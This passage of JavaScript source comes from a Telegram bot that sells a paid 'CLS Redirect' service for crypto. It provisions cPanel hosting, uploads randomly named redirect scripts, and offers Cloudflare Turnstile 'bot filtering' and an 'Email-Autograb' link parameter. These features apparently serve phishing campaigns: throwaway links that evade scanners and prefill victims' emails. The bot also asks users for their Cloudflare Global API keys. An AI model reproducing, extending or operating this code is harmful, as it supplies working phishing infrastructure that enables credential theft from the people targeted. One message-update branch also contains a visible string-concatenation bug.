        return ctx.reply("⏰ Rate limit exceeded. Please wait a minute before trying again.");
      }

      // Basic URL validation
      if (
        !redirectUrl.startsWith("http://") &&
        !redirectUrl.startsWith("https://")
      ) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid URL format. URL must start with http:// or https://\n" +
            "Format: `domain.com https://fb.com YOUR_TURNSTILE_KEY`",
          { parse_mode: "Markdown" },
        );
      }

      // Validate Turnstile key format (basic validation)
      if (turnstileKey && turnstileKey.length < 10) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid Turnstile key. Please provide a valid Cloudflare Turnstile site key.\n" +
            "Format: `domain.com https://fb.com YOUR_TURNSTILE_KEY`",
          { parse_mode: "Markdown" },
        );
      }

      const domain = domainInput.toLowerCase();
      const requestId = crypto.randomUUID().slice(0, 8);
      const log = L(requestId);

      // Check for admin free access or balance requirement
      const user = await getUserData(ctx.from.id);
      const cost = 80;
      let isAdminFree = false;
      let isSubscriptionUse = false;
      let paymentType = '';

      // Check if user has admin free access or is admin


      if (session.admin_free_access || 
          (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID)) {

        isAdminFree = true;
        paymentType = 'VIP Access';
        // Clear the free access flag after use
        if (session.admin_free_access) {
          delete session.admin_free_access;
        }
      } else if (user.subscription.active && !session.force_payment) {
        // Check daily limit (2 domains per day)
        const DAILY_DOMAIN_LIMIT = 2;

        // Reset daily counter if it's a new day
        const today = new Date().toDateString();
        const lastUsedDate = user.subscription.lastDomainDate ? new Date(user.subscription.lastDomainDate).toDateString() : null;

        if (today !== lastUsedDate) {
          user.subscription.dailyDomainsUsed = 0;
        }

        // Check if daily limit reached
        if (user.subscription.dailyDomainsUsed >= DAILY_DOMAIN_LIMIT) {
          session.awaiting_domain = true;
          return ctx.reply(
            `⭐ *Daily Limit Reached*\n\n` +
            `You've used your ${DAILY_DOMAIN_LIMIT} domains for today (6 links).\n` +
            `🔄 Your daily limit resets at midnight.\n\n` +
            `💡 You can still create domains with pay-per-use ($80 each).`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  user.balance >= 80 ? 
                    [{ text: '💳 Pay Per Domain ($80)', callback_data: 'redirect_payperuse' }] :
                    [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        // Use subscription
        isSubscriptionUse = true;
        paymentType = 'Monthly Subscription';
        user.subscription.domainsUsed++;
        user.subscription.dailyDomainsUsed++;
        user.subscription.lastDomainDate = new Date();

        const saveSuccess = await saveUserData(ctx.from.id, user);

        if (!saveSuccess) {
          console.error(`Failed to update domain count for user ${ctx.from.id}`);
        } else {
          console.log(`Subscription domain used for user ${ctx.from.id}: ${user.subscription.dailyDomainsUsed}/${DAILY_DOMAIN_LIMIT} today, ${user.subscription.domainsUsed} total`);
        }
      } else {
        // Regular payment
        paymentType = 'Pay-per-domain';
        if (user.balance < cost) {
          session.awaiting_domain = true;
          return ctx.reply(
            `💰 *Insufficient Balance*\n\n` +
            `Current Balance: $${user.balance.toFixed(2)}\n` +
            `Required: $${cost.toFixed(2)}\n` +
            `Needed: $${(cost - user.balance).toFixed(2)}\n\n` +
            `Please top up your account and try again.`,
            { parse_mode: "Markdown" }
          );
        }

        // Deduct the cost from user balance
        user.balance -= cost;
        const saveSuccess = await saveUserData(ctx.from.id, user);

        if (!saveSuccess) {
          console.error(`Failed to save balance deduction for user ${ctx.from.id}`);
          session.awaiting_domain = true;
          return ctx.reply(
            `❌ *Payment Processing Error*\n\n` +
            `There was an error processing your payment.\n` +
            `Your balance has NOT been charged.\n\n` +
            `Please try again.`,
            { parse_mode: "Markdown" }
          );
        }

        console.log(`Payment processed for user ${ctx.from.id}: $${cost} deducted, new balance: $${user.balance.toFixed(2)}`);
      }

      // Clear force payment flag
      if (session.force_payment) {
        delete session.force_payment;
      }

      log.info(
        {
          userId: ctx.from.id,
          username: ctx.from.username || "unknown",
          domain,
          redirectUrl,
          requestId,
          cost: isAdminFree ? 0 : cost,
          newBalance: user.balance,
          adminFree: isAdminFree
        },
        isAdminFree ? "🎯 Starting CLS redirect creation - VIP access" : "🎯 Starting CLS redirect creation - $80 deducted",
      );

      let statusMessage;

      if (isAdminFree) {
        statusMessage = await ctx.reply(
          `🎯 *Creating ${domain}*\n\n` +
          `${paymentType} - Free\n` +
          `ID: \`${requestId}\`\n\n` +
          `⏳ Setting up...`,
          { parse_mode: "Markdown" },
        );
      } else if (isSubscriptionUse) {
        const DAILY_DOMAIN_LIMIT = 2;
        statusMessage = await ctx.reply(
          `🎯 *Creating ${domain}*\n\n` +
          `${paymentType} - Today: ${user.subscription.dailyDomainsUsed}/${DAILY_DOMAIN_LIMIT}\n` +
          `ID: \`${requestId}\`\n\n` +
          `⏳ Setting up...`,
          { parse_mode: "Markdown" },
        );
      } else {
        statusMessage = await ctx.reply(
          `🎯 *Creating ${domain}*\n\n` +
          `${paymentType}: $${cost}\n` +
          `Balance: $${user.balance.toFixed(2)}\n` +
          `ID: \`${requestId}\`\n\n` +
          `⏳ Setting up...`,
          { parse_mode: "Markdown" },
        );
      }

      try {
        // Step 1: Create cPanel account
        log.info({ domain }, "Starting domain provisioning");
        const { user, password, ip } = await createAccount(domain, log);

        // Update status message
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `🎯 *CLS Redirect Creator*\n\n` +
          `✅ Hosting created successfully!\n` +
          `🔧 Installing magic scripts...`,
          { parse_mode: "Markdown" }
        );

        // Step 2: Create 3 folders and upload script files
        const urls = [];

        for (let i = 1; i <= 3; i++) {
          const folderName = rInt(100, 999).toString();

          try {
            // Update progress
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMessage.message_id,
              null,
              `🎯 *CLS Redirect Creator*\n\n` +
              `✅ Hosting ready!\n` +
              `🔧 Installing magic scripts... (${i}/3)\n` +
              `⚡ Almost there...`,
              { parse_mode: "Markdown" }
            );

            // Create directory
            await createDirectory(user, folderName);
            log.info({ user, folderName }, "Directory created");

            // Generate and upload script content with user's template preference and Turnstile key
            const { content: scriptContent, extension } = await generateCustomScriptContent(redirectUrl, ctx.from.id, turnstileKey);
            const fileName = rStr(99) + '.' + extension;
            await uploadScriptFile(user, folderName, fileName, scriptContent);

            const url = `https://${domain}/${folderName}/${fileName}`;
            urls.push(url);

            log.info({ user, url, template: extension }, "Script file uploaded");
          } catch (err) {
            log.error(
              { err: err.message, folderName },
              "Failed to create folder or upload file",
            );
            throw new Error(`Failed to setup folder ${i}: ${err.message}`);
          }
        }

        // Step 3: Replace status message with final results
        const responseMessage =
          `✅ *${domain} Ready*\n\n` +
          `🚀 *URLs:*\n` +
          urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
          "\n\n" +
          `Use the Cloudflare settings for Cloudflare nameservers you will add to your domain DNS\n` +
          `For Email-Autograb add ?email=email@office.com to your links`;

        // Replace the status message with final results
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          responseMessage,
          { parse_mode: "Markdown" }
        );

        // Save to user history (without sensitive server details including IP)
        const historyItem = {
          domain: domain,
          redirectUrl: redirectUrl,
          date: new Date(),
          urls: urls
          // Server credentials and IP not stored in user history for security
        };
        addUserHistory(ctx.from.id, historyItem);

        // Store domain and IP in session for potential Cloudflare DNS setup (session only, not in history)
        session.last_created_domain = domain;
        session.last_created_ip = ip;

        // Update user stats
        const userData = await getUserData(ctx.from.id);
        const userHistory = await loadUserHistory(ctx.from.id);
        userData.totalDomains = userHistory.length;
        await saveUserData(ctx.from.id, userData);

        log.info(
          { domain, urls, ip },
          "Domain provisioning completed successfully",
        );

        // Send admin notification with IP address
        if (process.env.ADMIN_ID && process.env.ADMIN_ID !== "your_telegram_admin_user_id" && bot) {
          try {
            // Get fresh user data to ensure we have current balance
            const currentUserData = await getUserData(ctx.from.id);
            const templateName = currentUserData.templateType === 'html' ? 'Plain Redirect Template' : 'Cloudflare Template';

            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `🎉 *New CLS Redirect Order*\n\n` +
              `👤 User: @${ctx.from.username || 'Unknown'} (${ctx.from.id})\n` +
              `👤 Name: ${ctx.from.first_name || 'Unknown'}\n` +
              `🌐 Domain: \`${domain}\`\n` +
              `🎯 Redirects To: ${redirectUrl}\n` +
              `🖥️ Server IP: \`${ip}\`\n` +
              `📋 Template: ${templateName}\n` +
              `💰 Payment: ${paymentType}${isSubscriptionUse ? ` (Today: ${currentUserData.subscription.dailyDomainsUsed}/2)` : isAdminFree ? ' - Free' : ' - $80'}\n` +
              `📅 Date: ${new Date().toLocaleString()}\n\n` +
              `🚀 Total URLs Created: ${urls.length}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `📊 User Balance: $${(currentUserData.balance || 0).toFixed(2)}\n` +
              `🔗 URLs:\n${urls.map((url, i) => `${i + 1}. ${url}`).join('\n')}`,
              { parse_mode: "Markdown" }
            );
            log.info({ requestId, adminId: process.env.ADMIN_ID }, "Admin notification sent successfully");
          } catch (adminError) {
            log.error({ 
              adminError: adminError.message, 
              adminId: process.env.ADMIN_ID,
              requestId,
              userBalance: user.balance
            }, "Failed to send admin notification");
          }
        }
      } catch (error) {
        log.error(
          { error: error.message, domain },
          "Domain provisioning failed",
        );

        // If we have a status message, edit it to show the error
        const errorMsg = formatErrorMessage(error, requestId);
        const msgOptions = { parse_mode: "Markdown" };

        if (statusMessage) {
          try {
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMessage.message_id,
              null,
              errorMsg,
              msgOptions
            );
          } catch (editError) {
            // If editing fails, send a new message
            await ctx.reply(errorMsg, msgOptions);
          }
        } else {
          await ctx.reply(errorMsg, msgOptions);
        }
      }

      // Clear session
      sessions.delete(ctx.from.id);
    } else {
      // No active session
      return ctx.reply("Please use /start to begin domain provisioning.");
    }
  });

  // ==========================================
  // INLINE KEYBOARD CALLBACK HANDLERS
  // ==========================================

bot.on('callback_query', async (ctx) => {
    const callbackData = ctx.callbackQuery.data;
    const session = getSession(ctx);

    // Always answer callback query first to remove loading state
    await ctx.answerCbQuery();

    try {
      // Handle main menu actions
      if (callbackData === 'topup') {
        const user = await getUserData(ctx.from.id);
        session.awaiting_amount = true;
        return ctx.editMessageText(
          `💎 *Balance*: $${user.balance.toFixed(2)}\nEnter USD amount:`,
          { parse_mode: "Markdown" }
        );
      }

      if (callbackData === 'subscription') {
        const user = await getUserData(ctx.from.id);

        if (user.subscription.active) {
          const endDate = new Date(user.subscription.endDate);
          const daysLeft = Math.max(0, Math.ceil((endDate - new Date()) / (1000 * 60 * 60 * 24)));
          const currentPrice = user.subscription.isFirstTime ? '$200' : '$200';

          const timeDisplay = daysLeft === 0 ? 'Expires today' : `${daysLeft} days left`;

          // Check daily usage
          const DAILY_DOMAIN_LIMIT = 2;
          const today = new Date().toDateString();
          const lastUsedDate = user.subscription.lastDomainDate ? new Date(user.subscription.lastDomainDate).toDateString() : null;
          const dailyUsed = (today === lastUsedDate) ? user.subscription.dailyDomainsUsed : 0;
          const dailyRemaining = DAILY_DOMAIN_LIMIT - dailyUsed;

          return ctx.editMessageText(
            `⭐ *Subscription Active*\n\n` +
            `📅 Expires: ${endDate.toDateString()} (${timeDisplay})\n` +
            `🎯 Today: ${dailyUsed}/${DAILY_DOMAIN_LIMIT} domains (${dailyUsed * 3} links)\n` +
            `✨ Available: ${dailyRemaining} domains (${dailyRemaining * 3} links)\n` +
            `📊 Total Used: ${user.subscription.domainsUsed} domains`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🎯 Create Domain', callback_data: 'redirect' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        } else {
          // Check if this is user's first subscription
        const isFirstTime = !user.subscription.hasEverSubscribed;
        const subscriptionPrice = isFirstTime ? 250 : 200;
        const savings = (60 * 80) - subscriptionPrice;

        return ctx.editMessageText(
            `⭐ *Monthly Subscription Plan*\n\n` +
            `💎 *First Time User:* $250\n` +
            `🔄 *Renewal:* $200\n\n` +
            `• 2 domains daily (6 links)\n` +
            `• 30-day Access`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  user.balance >= subscriptionPrice ? 
                    [{ text: `⭐ Subscribe Now ($${subscriptionPrice})`, callback_data: 'subscribe_monthly' }] :
                    [{ text: '💳 Add Funds First', callback_data: 'topup' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }
      }

      if (callbackData === 'redirect') {
        const user = await getUserData(ctx.from.id);
        const requiredAmount = 80;

        // Check if user has admin free access or is admin
        const hasAdminAccess = session.admin_free_access || 
                              (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID);

        // Check if user has active subscription with daily limit
        const DAILY_DOMAIN_LIMIT = 2;
        const today = new Date().toDateString();
        const lastUsedDate = user.subscription.lastDomainDate ? new Date(user.subscription.lastDomainDate).toDateString() : null;
        const dailyUsed = (today === lastUsedDate) ? user.subscription.dailyDomainsUsed : 0;
        const hasSubscription = user.subscription.active && dailyUsed < DAILY_DOMAIN_LIMIT;

        if (!hasAdminAccess && !hasSubscription && user.balance < requiredAmount) {
          return ctx.editMessageText(
            `💎 *CLS Redirect Service*\n\n` +
            `💰 *Insufficient Balance*\n` +
            `Current Balance: $${user.balance.toFixed(2)}\n` +
            `Service Cost: $${requiredAmount.toFixed(2)}\n` +
            `Additional Needed: $${(requiredAmount - user.balance).toFixed(2)}\n\n`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '⭐ View Subscription', callback_data: 'subscription' }],
                  [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔑 Request VIP Access', callback_data: 'admin_access' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        if (!hasAdminAccess && user.subscription.active && dailyUsed >= DAILY_DOMAIN_LIMIT) {
          return ctx.editMessageText(
            `⭐ *Daily Limit Reached*\n\n` +
            `🎯 You've used your ${DAILY_DOMAIN_LIMIT} domains for today (${dailyUsed * 3} links).\n` +
            `🔄 Your daily limit resets at midnight.\n` +
            `📅 Subscription expires: ${new Date(user.subscription.endDate).toDateString()}\n\n` +
            `💡 You can still create domains with pay-per-use ($80 each).`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  user.balance >= 80 ? 
                    [{ text: '💳 Pay Per Domain ($80)', callback_data: 'redirect_payperuse' }] :
                    [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        session.awaiting_domain = true;

        if (hasAdminAccess) {
          return ctx.editMessageText(
            "🎯 *CLS Redirect Creator*\n\n" +
              "✨ *Format:* `domain.com target-url TURNSTILE_KEY`\n" +
              "📝 *Example:* `mysite.com https://facebook.com 0x4AAA...`\n\n" +
              "💡 Turnstile key is optional (default key used if not provided)\n" +
              "🚀 Your redirect will be live in seconds!",
            { parse_mode: "Markdown" }
          );
        } else {
          return ctx.editMessageText(
            "🎯 *CLS Redirect Creator*\n\n" +
              "✨ *Format:* `domain.com target-url TURNSTILE_KEY`\n" +
              "📝 *Example:* `mysite.com https://facebook.com 0x4AAA...`\n\n" +
              "💡 Turnstile key is optional (default key used if not provided)\n" +
              `💰 *Service Cost:* $${requiredAmount}\n` +
              "🚀 Your redirect will be live in seconds!",
            { parse_mode: "Markdown" }
          );
        }
      }




      // Handle template settings
      if (callbackData === 'template_settings') {
        const user = await getUserData(ctx.from.id);
        const currentTemplate = user.templateType || 'html';

        return ctx.editMessageText(
          `⚙️ *Template Settings*\n\n` +         
          `📄 *Plain Redirect Template* - Simple HTML redirect\n` +
          `☁️ *Cloudflare Template* - Advanced protection with bot filtering\n\n` +        
          `Choose your preferred template type:`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: currentTemplate === 'html' ? '✅ Plain Redirect Template' : '📄 Plain Redirect Template', callback_data: 'set_template_html' },
                  { text: currentTemplate === 'php' ? '✅ Cloudflare Template' : '☁️ Cloudflare Template', callback_data: 'set_template_php' }
                ],
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle template type selection
      if (callbackData === 'set_template_html' || callbackData === 'set_template_php') {
        const user = await getUserData(ctx.from.id);
        const newTemplate = callbackData === 'set_template_html' ? 'html' : 'php';
        const templateName = newTemplate === 'html' ? 'Plain Redirect Template' : 'Cloudflare Template';

        console.log(`[Template Settings] User ${ctx.from.id} changing template from "${user.templateType}" to "${newTemplate}"`);

        user.templateType = newTemplate;
        const saveSuccess = await saveUserData(ctx.from.id, user);

        console.log(`[Template Settings] Save result: ${saveSuccess}, new templateType: ${user.templateType}`);

        // Verify it was saved
        const verifyUser = await getUserData(ctx.from.id);
        console.log(`[Template Settings] Verification - templateType in DB: "${verifyUser.templateType}"`);

        // Get reference image if available
        const referenceImage = await db.getTemplateReferenceImage(newTemplate);

        if (referenceImage) {
          // Delete the original message since we can't edit photo messages
          try {
            await ctx.deleteMessage();
          } catch (e) {
            // Ignore if deletion fails
          }

          await ctx.telegram.sendPhoto(
            ctx.from.id,
            referenceImage,
            {
              caption: `✅ *Template Updated!*\n\n` +
                `Your template has been set to *${templateName}*, and all new redirects will use this template. \n\n` +
                `📸 Sample image above.`,
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '⚙️ Change Template', callback_data: 'template_settings' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        } else {
          await ctx.editMessageText(
            `✅ *Template Updated!*\n\n` +
            `Your template has been set to *${templateName}*, and all new redirects will use this template.\n\n` +
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '⚙️ Change Template', callback_data: 'template_settings' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }
        return;
      }

      // Admin template image management
      if (callbackData === 'admin_template_images') {
        if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
          return ctx.answerCbQuery('Unauthorized', { show_alert: true });
        }

        const allImages = await db.getAllTemplateReferenceImages();
        const htmlImage = allImages['html'] ? '✅' : '❌';
        const phpImage = allImages['php'] ? '✅' : '❌';

        return ctx.editMessageText(
          `🖼️ *Template Reference Images*\n\n` +
          `${htmlImage} Plain Redirect Template\n` +
          `${phpImage} Cloudflare Template\n\n` +
          `Select a template to set/update its reference image:`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '📄 Set Plain Template Image', callback_data: 'admin_set_image_html' }],
                [{ text: '☁️ Set Cloudflare Template Image', callback_data: 'admin_set_image_php' }],
                [{ text: '🔙 Back to Admin Panel', callback_data: 'admin_access' }]
              ]
            }
          }
        );
      }

      if (callbackData === 'admin_set_image_html' || callbackData === 'admin_set_image_php') {
        if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
          return ctx.answerCbQuery('Unauthorized', { show_alert: true });
        }

        const templateType = callbackData === 'admin_set_image_html' ? 'html' : 'php';
        const templateName = templateType === 'html' ? 'Plain Redirect Template' : 'Cloudflare Template';

        session.awaiting_template_image = templateType;

        return ctx.editMessageText(
          `🖼️ *Set Reference Image*\n\n` +
          `Template: ${templateName}\n\n` +
          `📸 Send a photo to set as the reference image for this template.\n\n` +
          `This image will be shown to users when they select this template.`,
          { parse_mode: "Markdown" }
        );
      }

      // Handle admin access request
      if (callbackData === 'cloudflare_setup') {
        const session = getSession(ctx);
        session.awaiting_cloudflare_credentials = true;

        return ctx.editMessageText(
          `🔐 *Cloudflare Security Setup*\n\n` +
          `Please send them in this format:\n` +
          `\`email@example.com YOUR_GLOBAL_API_KEY\`\n\n` +
          `ℹ️ Find your Global API Key at:\n` +
          `Cloudflare Dashboard → My Profile → API Tokens → Global API Key`,
          { parse_mode: "Markdown" }
        );
      }

      if (callbackData === 'admin_access') {
        // Check if user is admin - gets free access
        const log = L("admin-access");


        log.info({
          userId: ctx.from.id,
          adminId: process.env.ADMIN_ID,
          userIdStr: ctx.from.id.toString(),
          isMatch: ctx.from.id.toString() === process.env.ADMIN_ID
        }, "Admin access check");

        if (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID) {
          return ctx.editMessageText(
            "🔑 *Admin Panel*\n\n" +
            "Choose an action:",
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🎯 Create Free Domain', callback_data: 'admin_free_domain' }],
                  [{ text: '📢 Broadcast Message', callback_data: 'admin_broadcast' }],
                  [{ text: '🖼️ Set Template Images', callback_data: 'admin_template_images' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        // For regular users - send approval request to admin
        const requestId = crypto.randomUUID().slice(0, 8);
        const adminRequest = {
          id: requestId,
          userId: ctx.from.id,
          username: ctx.from.username || 'Unknown',
          firstName: ctx.from.first_name || 'Unknown',
          type: 'admin_access',
          date: new Date(),
          status: 'pending'
        };

        adminRequests.set(requestId, adminRequest);

        // Send to admin for approval
        if (process.env.ADMIN_ID && process.env.ADMIN_ID !== "your_telegram_admin_user_id") {
          try {
            const adminKeyboard = {
              inline_keyboard: [
                [
                  { text: '✅ Grant Access', callback_data: `grant_access_${requestId}` },
                  { text: '❌ Deny Access', callback_data: `deny_access_${requestId}` }
                ]
              ]
            };

            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `🔑 *Admin Access Request*\n\n` +
              `👤 User: @${adminRequest.username} (${adminRequest.userId})\n` +
              `👋 Name: ${adminRequest.firstName}\n` +
              `📅 Date: ${adminRequest.date.toLocaleString()}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `User is requesting free domain provisioning access.`,
              { 
                parse_mode: "Markdown",
                reply_markup: adminKeyboard
              }
            );
          } catch (adminError) {
            console.log("Failed to send admin notification");
          }
        }

        return ctx.editMessageText(
          `🔑 *Admin Access Request Submitted*\n\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `⏳ Your request has been sent to admin for approval.\n` +
          `You willbe notified once it's processed.\n\n` +
          `If approved, you'll get free domain provisioning access.`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle crypto selection
      if (callbackData.startsWith('select_')) {
        const cryptoType = callbackData.replace('select_', '');
        session.selected_crypto = cryptoType;
        session.awaiting_amount = true;

        const cryptoNames = {
          'BTC': '₿ Bitcoin (BTC)',
          'USDT_TRC20': '🟡 Tether TRC20',
          'USDT_ERC20': '💎 USDT ERC20'
        };

        return ctx.editMessageText(
          `💰 *${cryptoNames[cryptoType]}*\n\n` +
          `Please enter the amount you want to top up (in USD):\n\n` +
          `Example: 50`,
          { parse_mode: "Markdown" }
        );
      }

      // Handle crypto payment selection
      if (callbackData.startsWith('pay_')) {
        const parts = callbackData.split('_');
        let cryptoType, amount;

        if (parts.length === 4) {
          // Format: pay_USDT_TRC20_50 or pay_USDT_ERC20_50
          cryptoType = `${parts[1]}_${parts[2]}`;
          amount = parts[3];
        } else {
          // Format: pay_BTC_50
          cryptoType = parts[1];
          amount = parts[2];
        }

        const usdAmount = parseFloat(amount);
        const paymentData = await generateTopUpMessage(usdAmount, cryptoType);

        await ctx.editMessageText(paymentData.text, { 
          parse_mode: "Markdown",
          reply_markup: paymentData.keyboard
        });
        return;
      }

      // Handle payment confirmation
      if (callbackData.startsWith('paid_')) {
        const parts = callbackData.split('_');
        let cryptoType, amount;

        if (parts.length === 4) {
          cryptoType = `${parts[1]}_${parts[2]}`;
          amount = parts[3];
        } else {
          cryptoType = parts[1];
          amount = parts[2];
        }

        const session = getSession(ctx);
        session.awaiting_payment_proof = {
          cryptoType,
          amount: parseFloat(amount)
        };

        try {
          await ctx.editMessageText(
            `📸 *Payment Confirmation Required*\n\n` +
            `Please provide a screenshot of your payment confirmation showing the $${amount} amount, destination address, and transaction confirmation.\n\n` +
            `💡Send the transaction hash (TXID) as text or link.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.error('Error editing payment confirmation message:', error);
          await ctx.reply(
            `📸 *Payment Confirmation Required*\n\n` +
            `Please provide a screenshot of your payment confirmation showing the $${amount} amount, destination address, and transaction confirmation.\n\n` +
            `💡Send the transaction hash (TXID) as text or link.`,
            { parse_mode: "Markdown" }
          );
        }
        return;
      }

      // Handle payment cancellation
      if (callbackData === 'cancel_payment') {
        await ctx.editMessageText(
          "❌ Payment cancelled. Use /start to return to main menu.",
          { parse_mode: "Markdown" }
        );
        return;
      }

      // Handle topup cancellation
      if (callbackData === 'cancel_topup') {
        await ctx.editMessageText(
          "❌ Top-up cancelled. Use /start to return to main menu.",
          { parse_mode: "Markdown" }
        );
        return;
      }

      // Handle payment approval
      if (callbackData.startsWith('approve_payment_')) {
        const requestId = callbackData.replace('approve_payment_', '');

        await ctx.answerCbQuery('Processing payment approval...');

        try {
          // Get payment request from database
          const paymentRequest = await db.getPaymentRequest(requestId);

          if (!paymentRequest) {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
            return;
          }

          if (paymentRequest.status !== 'pending') {
            await bot.telegram.sendMessage(
              ctx.from.id,
              `❌ Payment request already ${paymentRequest.status}.`
            );
            return;
          }

          // Get user ID from payment request (not from parsing request ID)
          const userId = parseInt(paymentRequest.user_id);

          // Get user data from database
          const userData = await getUserData(userId);

          if (!userData) {
            await ctx.answerCbQuery('User data not found', { show_alert: true });
            return;
          }

          if (paymentRequest) {
            // Add amount to user balance
            userData.balance = (userData.balance || 0) + paymentRequest.amount;

            // Mark payment as approved in database
            await db.updatePaymentRequestStatus(requestId, 'approved', new Date().toISOString(), null);

            // Auto-activate subscription if payment matches subscription pricing
            const isSubscriptionPayment = paymentRequest.amount === 250 || paymentRequest.amount === 200;
            if (isSubscriptionPayment && !userData.subscription.active) {
              const isFirstTime = paymentRequest.amount === 250;

              // Activate subscription
              userData.subscription.active = true;
              userData.subscription.startDate = new Date().toISOString();
              userData.subscription.endDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
              userData.subscription.domainsUsed = 0;
              userData.subscription.hasEverSubscribed = true;
              userData.subscription.isFirstTime = !isFirstTime;

              // Deduct subscription cost from balance
              userData.balance -= paymentRequest.amount;

              console.log(`Auto-activated subscription for user ${userId}: ${isFirstTime ? 'First-time' : 'Renewal'} - $${paymentRequest.amount}`);
            }

            // Save updated user data to database
            await saveUserData(userId, userData);
            console.log(`User ${userId} balance updated in database: $${userData.balance}`);

            // Notify user
            try {
              const subscriptionActivated = isSubscriptionPayment && userData.subscription.active;
              let userMessage = `✅ *Payment Approved!*\n\n` +
                `💰 Amount: $${paymentRequest.amount}\n` +
                `💳 Balance: $${userData.balance.toFixed(2)}\n\n`;

              if (subscriptionActivated) {
                const endDate = new Date(userData.subscription.endDate);
                userMessage += `⭐ *Monthly Subscription Activated!*\n\n` +
                  `📅 Valid until: ${endDate.toDateString()}\n` +
                  `🎯 Domains included: 60\n` +
                  `✨ Ready to create unlimited domains!\n\n` +
                  `Use /start to create your first domain.`;
              } else {
                userMessage += `Your payment has been verified and added to your account.\n` +
                  `You can now use your balance for domain provisioning.`;
              }

              await bot.telegram.sendMessage(userId, userMessage, { parse_mode: "Markdown" });
            } catch (userError) {
              console.log("Failed to notify user of payment approval:", userError.message);
            }

            // Send confirmation to admin
            await ctx.answerCbQuery('✅ Payment approved successfully!', { show_alert: true });

            let adminMessage = `✅ *Payment Approved Successfully*\n\n` +
              `💰 Amount: $${paymentRequest.amount}\n` +
              `👤 User ID: ${userId}\n` +
              `💳 User's New Balance: $${userData.balance.toFixed(2)}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n`;

            if (isSubscriptionPayment && userData.subscription.active) {
              const endDate = new Date(userData.subscription.endDate);
              const subscriptionType = paymentRequest.amount === 250 ? 'First-time' : 'Renewal';
              adminMessage += `⭐ *Subscription Auto-Activated*\n` +
                `📋 Type: ${subscriptionType} ($${paymentRequest.amount})\n` +
                `📅 Valid until: ${endDate.toDateString()}\n` +
                `🎯 Domains available: 60\n\n`;
            }

            adminMessage += `User has been notified and ${isSubscriptionPayment && userData.subscription.active ? 'subscription activated' : 'balance updated'}.`;

            await bot.telegram.sendMessage(ctx.from.id, adminMessage, { parse_mode: "Markdown" });
          } else {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
          }
        } catch (error) {
          console.error('Payment approval error:', error);
          await bot.telegram.sendMessage(
            ctx.from.id,
            "❌ Error processing payment approval. Please check logs."
          );
        }
        return;
      }

      // Handle payment rejection
      if (callbackData.startsWith('reject_payment_')) {
        const requestId = callbackData.replace('reject_payment_', '');

        await ctx.answerCbQuery('Processing payment rejection...');

        try {
          // Get payment request from database
          const paymentRequest = await db.getPaymentRequest(requestId);

          if (!paymentRequest) {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
            return;
          }

          if (paymentRequest.status !== 'pending') {
            await bot.telegram.sendMessage(
              ctx.from.id,
              `❌ Payment request already ${paymentRequest.status}.`
            );
            return;
          }

          // Get user ID from payment request (not from parsing request ID)
          const userId = parseInt(paymentRequest.user_id);

          if (paymentRequest) {
            // Mark payment as rejected in database
